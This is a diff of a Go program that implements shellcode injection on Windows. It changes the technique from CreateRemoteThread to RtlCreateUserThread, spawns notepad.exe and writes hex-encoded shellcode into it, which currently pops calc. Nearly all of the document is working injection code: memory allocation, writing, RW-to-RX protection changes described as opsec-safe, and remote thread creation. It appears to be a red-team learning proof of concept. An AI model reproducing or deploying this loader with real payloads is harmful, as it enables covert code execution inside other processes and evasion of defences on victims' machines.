@@ -1,9 +1,8 @@
 /*
-	8/25/2020
 
-	CreateRemoteThread shellcode injection technique
+	RtlCreateUserThread shellcode injection technique
 
-	currently pops shellcode for calc
+	currently creates an instance of notepad and injects to pop shellcode for calc
 
 
 	METHOD:
@@ -12,8 +11,8 @@
 			2. VirtualAllocEx to create/reserve a read-write page in memory
 			3. WriteProcessMemory copies shellcode to address of rw page
 			4. VirtualProtectEx adjusts page to allow execution
-			5. CreateRemoteThread kicks off execution
-
+			5. RtlCreateUserThread to resume execution
+			6. CloseHandle closes handle to process
 
 	TODO:
 
@@ -22,17 +21,10 @@
 
 	BUILD:
 
-		go build createremotethread.go
-
-		I like to use notepad to test
+		go build rtlcreateuserthread.go -o rtlcreateuserthread.exe
 
 
 
-	THIS WORKS!!!
-
-	inspired by https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/CreateRemoteThread/main.go
-
-	hoping to use this as a jumping off poiint to learn process injection techniques in golang
 */
 
 package main
@@ -42,6 +34,7 @@ import (
 	"flag"
 	"fmt"
 	"log"
+	"syscall"
 	"unsafe"
 
 	// Sub Repositories
@@ -64,6 +57,10 @@ const (
 
 	PAGE_READWRITE    = 0x04
 	PAGE_EXECUTE_READ = 0x20
+
+	CREATE_NO_WINDOW = 0x08000000
+
+	THREAD_SET_CONTEXT = 0x0010
 )
 
 func main() {
@@ -71,34 +68,42 @@ func main() {
 	//ARGS
 
 	verbose := flag.Bool("verbose", false, "Enable verbose output")
-	pid := flag.Int("pid", 0, "Process ID to inject shellcode into")
+	targetprocess := flag.String("targetprocess", "C:\\WINDOWS\\system32\\notepad.exe", "Target process to spawn inject into (full path plz)")
 	flag.Parse()
 
-	// Pop Calc Shellcode - SOLID SHELLCODE POC
+	//Pop Calc Shellcode - SOLID SHELLCODE POC
 	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
 	if errShellcode != nil {
 		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
 	}
 
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
 	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
 	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
 	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
-	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
+	CloseHandle := kernel32.NewProc("CloseHandle")
+	RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
 
-	//Opening process handle - OpenProcess
-	pHandle, errOpenProcess := windows.OpenProcess(CREATE_THREAD_ACCESS, false, uint32(*pid))
+	var si windows.StartupInfo
+	var pi windows.ProcessInformation
+	var psec windows.SecurityAttributes
+	var tsec windows.SecurityAttributes
 
-	if errOpenProcess != nil {
-		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
+	argv := syscall.StringToUTF16Ptr(*targetprocess)
+
+	errCreateProcess := windows.CreateProcess(argv, nil, &psec, &tsec, false, 0, nil, nil, &si, &pi)
+
+	if errCreateProcess != nil {
+		log.Fatal(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
 	}
 	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Successfully got a handle to process %d", *pid))
+		fmt.Println(fmt.Sprintf("[-]Successfully created a process with PID: %d", pi.ProcessId))
 	}
 
 	//Allocating memory in process - VirtualAllocEx
-	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_PERMISSIONS, PAGE_READWRITE)
+	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), MEM_PERMISSIONS, PAGE_READWRITE)
 
 	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
@@ -108,45 +113,45 @@ func main() {
 		log.Fatal("[!]VirtualAllocEx failed and returned 0")
 	}
 	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", *pid))
+		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", pi.ProcessId))
 	}
 
 	//Writing shellcode into allocated memory - WriteProcessMemory
-	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pi.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 
 	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
 	}
 	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", *pid))
+		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", pi.ProcessId))
+
 	}
 
 	//Modifying permissions from RW to RX - VirtualProtectEx (RWX is bad and not opsec safe)
 	rw := PAGE_READWRITE
-	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&rw)))
+	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pi.Process), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&rw)))
 	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
 	}
 	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *pid))
+		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", pi.ProcessId))
 	}
 
-	//Calling shellcode in memory - CreateRemoteThread
-	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
-	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
+	var t_handle uintptr
+	_, _, errRtlCreateUserThread := RtlCreateUserThread.Call((uintptr)(unsafe.Pointer(pi.Process)), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&t_handle)), 0)
+
+	if errRtlCreateUserThread != nil && errRtlCreateUserThread.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling RtlCreateUserThread:\r\n%s", errRtlCreateUserThread.Error()))
 	}
 	if *verbose {
-		fmt.Println(fmt.Sprintf("[+]Successfully create a remote thread in PID %d", *pid))
+		fmt.Println(fmt.Sprintf("[-]Successfully called RtlCreateUserThread on PID %d", pi.ProcessId))
 	}
 
-	//close handle to process
-	errCloseHandle := windows.CloseHandle(pHandle)
-	if errCloseHandle != nil {
+	_, _, errCloseHandle := CloseHandle.Call(uintptr(uint32(pi.Process)))
+	if errCloseHandle != nil && errCloseHandle.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
 	}
 	if *verbose {
-		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", *pid))
+		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", pi.ProcessId))
 	}
-
 }
